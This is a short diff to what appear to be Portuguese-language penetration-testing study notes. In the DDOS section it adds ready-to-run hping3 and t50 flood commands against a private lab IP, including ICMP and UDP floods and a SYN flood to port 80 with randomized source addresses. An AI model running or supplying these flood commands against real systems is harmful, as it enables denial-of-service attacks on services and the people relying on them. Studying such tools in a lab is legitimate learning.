@@ -536,7 +536,11 @@ Colhendo informações
 
   DDOS
     apt install iptraf-ng -> monitorador de pacotes
-    hping3
+    hping3 192.168.100.73 --faster --icmp -> manda os pacotes mais rapido
+    hping3 192.168.100.73 --flood --icmp -> manda o maximo de pacotes
+    hping3 192.168.100.73 --udp --flood --data 150000
+    hping3 192.168.100.73 -S --flood -p 80 --rand-source -> atacar na camada de transporte
+    t50 192.168.100.73 --flood --syn --dport 80
 
   Google Hacking
     "Intitle"
